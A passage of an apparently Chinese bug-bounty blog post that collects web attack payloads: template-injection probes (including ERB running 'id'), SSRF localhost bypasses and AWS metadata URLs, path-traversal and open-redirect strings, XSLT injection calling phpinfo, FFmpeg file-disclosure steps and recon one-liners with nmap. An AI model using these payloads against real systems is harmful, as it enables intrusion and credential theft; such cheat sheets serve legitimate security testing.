+<h3 id="Template-Injection"><a href="#Template-Injection" class="headerlink" title="Template Injection"></a>Template Injection</h3><p><strong>Ruby</strong></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=<span class="string">`id`</span>%&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>Twig</strong></p>
+<p>The following payload should output <code>49</code>.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*&apos;7&apos;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>Jinja</strong></p>
+<p>This payload should output <code>7777777</code>.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*&apos;7&apos;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>…..</p>
+<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://0177.1/</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://0x7f.1/</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.000.000.1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://520968996</span><br></pre></td></tr></table></figure>
+<p><em>Note:</em> The latter can be calculated using <a href="http://www.subnetmask.info/" target="_blank" rel="noopener">http://www.subnetmask.info/</a></p>
+<p><strong>Exotic Handlers</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://, dict://, php://, jar://, tftp://</span><br></pre></td></tr></table></figure>
+<p><strong>IPv6</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[::1]</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[::]</span><br></pre></td></tr></table></figure>
+<p><strong>Wildcard DNS</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">10.0.0.1.xip.io</span><br><span class="line">www.10.0.0.1.xip.io</span><br><span class="line">mysite.10.0.0.1.xip.io</span><br><span class="line">foo.bar.10.0.0.1.xip.io</span><br></pre></td></tr></table></figure>
+<p><em>Link:</em> <a href="http://xip.io" target="_blank" rel="noopener">http://xip.io</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">10.0.0.1.nip.io</span><br><span class="line">app.10.0.0.1.nip.io</span><br><span class="line">customer1.app.10.0.0.1.nip.io</span><br><span class="line">customer2.app.10.0.0.1.nip.io</span><br><span class="line">otherapp.10.0.0.1.nip.io</span><br></pre></td></tr></table></figure>
+<p><em>Link:</em> <a href="http://nip.io" target="_blank" rel="noopener">http://nip.io</a></p>
+<p><strong>AWS EC2 Metadata</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://169.254.169.254/latest/meta-data/</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://169.254.169.254/latest/meta-data/local-hostname</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://169.254.169.254/latest/meta-data/public-hostname</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>If there is an IAM role associated with the instance, role-name is the name of the role, and role-name contains the temporary security credentials associated with the role […]</p>
+</blockquote>
+<p><em>Link:</em> <a href="http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html" target="_blank" rel="noopener">http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html</a> (includes a comprehensive Instance Metadata Categories table)</p>
+<h3 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h3><p><strong>Filter Bypass</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../\</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..\/</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/..</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\/..</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/%5c..</span><br></pre></td></tr></table></figure>
+<p><strong>FFmpeg Local File Disclosure</strong></p>
+<p>This <a href="https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py" target="_blank" rel="noopener">script</a> by @neex can be used to disclose local files on FFmpeg hosts which parse externally-referencing <a href="https://ffmpeg.org/ffmpeg-formats.html#hls-2" target="_blank" rel="noopener">HLS playlists</a>.</p>
+<p><em>Steps to reproduce</em></p>
+<ol>
+<li>Please download the script from @neex to your “attacker” instance</li>
+<li>Execute the script with your desired parameters: <code>python3 gen_xbin_avi.py file:///etc/hostname bugbounty.avi</code></li>
+<li>Upload the generated AVI file to your target site (e.g. within a ‘video upload page’)</li>
+<li>The target may process the malicious HLS inclusion with FFmpeg on the server-side.</li>
+<li>Play the uploaded AVI via the target site. If successful, your desired file will be disclosed within the video.</li>
+</ol>
+<p>Alternative scripts exist which may generate different HLS formats or lead to the desired file being disclosed in a different manner.</p>
+<p><strong>Blogs</strong></p>
+<ul>
+<li><a href="http://pastie.org/840199" target="_blank" rel="noopener">http://pastie.org/840199</a></li>
+<li><a href="http://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/" target="_blank" rel="noopener">http://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/</a></li>
+<li><a href="http://www.notsosecure.com/folder2/2010/08/20/lfi-code-exec-remote-root/?utm_source=twitterfeed&amp;utm_medium=twitter" target="_blank" rel="noopener">http://www.notsosecure.com/folder2/2010/08/20/lfi-code-exec-remote-root/?utm_source=twitterfeed&amp;utm_medium=twitter</a></li>
+<li><a href="http://labs.neohapsis.com/2008/07/21/local-file-inclusion-%E2%80%93-tricks-of-the-trade/" target="_blank" rel="noopener">http://labs.neohapsis.com/2008/07/21/local-file-inclusion-%E2%80%93-tricks-of-the-trade/</a></li>
+<li><a href="http://www.digininja.org/blog/when_all_you_can_do_is_read.php" target="_blank" rel="noopener">http://www.digininja.org/blog/when_all_you_can_do_is_read.php</a></li>
+</ul>
+<h3 id="Open-Redirect"><a href="#Open-Redirect" class="headerlink" title="Open Redirect"></a>Open Redirect</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/%09/google.com</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/%5cgoogle.com</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//www.google.com/%2f%2e%2e</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//www.google.com/%2e%2e</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//google.com/</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//google.com/%2f..</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//\google.com</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/\victim.com:80%40google.com</span><br></pre></td></tr></table></figure>
+<h3 id="Possible-open-redirect-parameters"><a href="#Possible-open-redirect-parameters" class="headerlink" title="Possible open redirect parameters"></a>Possible open redirect parameters</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=https://&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?next=http://&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?next=https://&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=https://&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=//&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=$2f%2f&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?next=//&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?next=$2f%2f&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=//&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=$2f%2f&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=//&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/redirect/&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/cgi-bin/redirect.cgi?&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/out/&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/out?&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/out?/&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/out?//&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/out?/\&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/out?///&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?view=&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?view=/&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?view=//&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?view=/\&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?view=///&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/login?to=&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/login?to=/&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/login?to=//&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/login?to=/\&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/login?to=///&#123;target&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>Open Redirect Payloads</strong> by @cujanovic</p>
+<p><a href="https://github.com/cujanovic/Open-Redirect-Payloads" target="_blank" rel="noopener">https://github.com/cujanovic/Open-Redirect-Payloads</a></p>
+<p><strong>Open Redirect Paramters</strong> by @fuzzdb-project</p>
+<p><a href="https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/redirect/redirect-urls-template.txt" target="_blank" rel="noopener">https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/redirect/redirect-urls-template.txt</a></p>
+<h3 id="XSLT-Injection"><a href="#XSLT-Injection" class="headerlink" title="XSLT Injection"></a>XSLT Injection</h3><p><strong>Backend infos</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xsl:version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span> <span class="attr">xmlns:php</span>=<span class="string">"http://php.net/xsl"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">xsl:text</span>&gt;</span>xsl:vendor = <span class="tag">&lt;/<span class="name">xsl:text</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"system-property('xsl:vendor')"</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">xsl:text</span>&gt;</span>xsl:version = <span class="tag">&lt;/<span class="name">xsl:text</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"system-property('xsl:version')"</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>Injecting in PHP</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xsl:version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span> <span class="attr">xmlns:php</span>=<span class="string">"http://php.net/xsl"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">name</span>=<span class="string">"bugbounty"</span> <span class="attr">select</span>=<span class="string">"php:function('phpinfo')"</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><h4 id="Certspotter"><a href="#Certspotter" class="headerlink" title="Certspotter"></a>Certspotter</h4><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://certspotter.com/api/v0/certs\?domain\=example.com | jq <span class="string">'.[].dns_names[]'</span> | sed <span class="string">'s/\"//g'</span> | sed <span class="string">'s/\*\.//g'</span> | uniq</span><br></pre></td></tr></table></figure>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://certspotter.com/api/v0/certs\?domain\=example.com | jq <span class="string">'.[].dns_names[]'</span> | sed <span class="string">'s/\"//g'</span> | sed <span class="string">'s/\*\.//g'</span> | uniq | dig +short -f - | uniq | nmap -T5 -Pn -sS -i - -p 80,443,21,22,8080,8081,8443 --open -n -oG -</span><br></pre></td></tr></table></figure>
+<h4 id="Sublist3r-One-liner"><a href="#Sublist3r-One-liner" class="headerlink" title="Sublist3r One-liner"></a>Sublist3r One-liner</h4><p>This runs <a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">Sublist3r</a> on a list of domains and outputs the results in separate files.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. &lt;(cat domains | xargs -n1 -i&#123;&#125; python sublist3r.py -d &#123;&#125; -o &#123;&#125;.txt)</span><br></pre></td></tr></table></figure>
+<h4 id="Apktool-to-LinkFinder"><a href="#Apktool-to-LinkFinder" class="headerlink" title="Apktool to LinkFinder"></a><a href="https://ibotpeaches.github.io/Apktool/" target="_blank" rel="noopener">Apktool</a> to <a href="https://github.com/GerbenJavado/LinkFinder" target="_blank" rel="noopener">LinkFinder</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool d app.apk; cd app;mkdir collection; find . -name \*.smali -exec sh -c &quot;cp &#123;&#125; collection/\$(head /dev/urandom | md5 | cut -d&apos; &apos; -f1).smali&quot; \;; linkfinder -i &apos;collection/*.smali&apos; -o cli</span><br></pre></td></tr></table></figure>
+<h4 id="Aquatone-One-liner"><a href="#Aquatone-One-liner" class="headerlink" title="Aquatone One-liner"></a><a href="https://github.com/michenriksen/aquatone/" target="_blank" rel="noopener">Aquatone</a> One-liner</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ echo &quot;aquatone-discover -d \$1 &amp;&amp; aquatone-scan -d \$1 --ports huge &amp;&amp; aquatone-takeover -d \$1 &amp;&amp; aquatone-gather -d \$1&quot; &gt;&gt; aqua.sh &amp;&amp; chmod +x aqua.sh</span><br><span class="line">$./aqua.sh domain.com</span><br></pre></td></tr></table></figure>
+<h4 id="relative-url-extractor"><a href="#relative-url-extractor" class="headerlink" title="relative-url-extractor"></a><a href="https://github.com/jobertabma/relative-url-extractor" target="_blank" rel="noopener">relative-url-extractor</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ruby extract.rb demo-file.js</span><br><span class="line">$ ruby extract.rb https://hackerone.com/some-file.js</span><br><span class="line">$ ruby extract.rb &apos;|cat demo-file.js&apos; -c</span><br></pre></td></tr></table></figure>
+    </article>
+    <!-- license  -->
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2019/08/26/探索mysql客户端的攻击链/" title="探索mysql客户端的攻击链">
+                    <div class="prevTitle">探索mysql客户端的攻击链</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+    <div id="comment"></div>
+    <script>
+    new Valine({
+        el: '#comment' ,
+        notify:false, 
+        verify:false, 
+        appId: "FuPdFy9xCtoivKmiix3FHb4d-gzGzoHsz",
+        appKey: "pAQSVceyfizzVqhmmyUQeX2j",
+        placeholder: "一起唠嗑:)",
+        path:window.location.pathname, 
+        avatar:'mm' 
+    });
+    </script>
+
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:7989933065@qq.com" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/Ethancck" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title="wechat">
+                  
+                  <img class="profile-qr" src="/assets/weixin.png">
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="//twitter.com/Ethan18977083" class="iconfont-archer twitter" target="_blank" title="twitter"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDOR-不安全的直接对象引用"><span class="toc-number">2.</span> <span class="toc-text">IDOR(不安全的直接对象引用)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#分类"><span class="toc-number">2.1.</span> <span class="toc-text">分类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#测试"><span class="toc-number">2.2.</span> <span class="toc-text">测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用Authz插件检测"><span class="toc-number">2.3.</span> <span class="toc-text">使用Authz插件检测</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cross-Origin-Resource-Sharing-CORS"><span class="toc-number">3.</span> <span class="toc-text">Cross Origin Resource Sharing (CORS)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#简介"><span class="toc-number">3.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#测试-1"><span class="toc-number">3.2.</span> <span class="toc-text">测试</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CRLF-Injection-HTTP-Response-Splitting"><span class="toc-number">4.</span> <span class="toc-text">CRLF Injection || HTTP Response Splitting</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#简介-1"><span class="toc-number">4.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#测试-2"><span class="toc-number">4.2.</span> <span class="toc-text">测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload"><span class="toc-number">4.3.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS"><span class="toc-number">5.</span> <span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE"><span class="toc-number">6.</span> <span class="toc-text">XXE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Template-Injection"><span class="toc-number">7.</span> <span class="toc-text">Template Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF"><span class="toc-number">8.</span> <span class="toc-text">SSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LFI"><span class="toc-number">9.</span> <span class="toc-text">LFI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Open-Redirect"><span class="toc-number">10.</span> <span class="toc-text">Open Redirect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Possible-open-redirect-parameters"><span class="toc-number">11.</span> <span class="toc-text">Possible open redirect parameters</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSLT-Injection"><span class="toc-number">12.</span> <span class="toc-text">XSLT Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#信息搜集"><span class="toc-number">13.</span> <span class="toc-text">信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Certspotter"><span class="toc-number">13.1.</span> <span class="toc-text">Certspotter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Sublist3r-One-liner"><span class="toc-number">13.2.</span> <span class="toc-text">Sublist3r One-liner</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Apktool-to-LinkFinder"><span class="toc-number">13.3.</span> <span class="toc-text">Apktool to LinkFinder</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Aquatone-One-liner"><span class="toc-number">13.4.</span> <span class="toc-text">Aquatone One-liner</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#relative-url-extractor"><span class="toc-number">13.5.</span> <span class="toc-text">relative-url-extractor</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
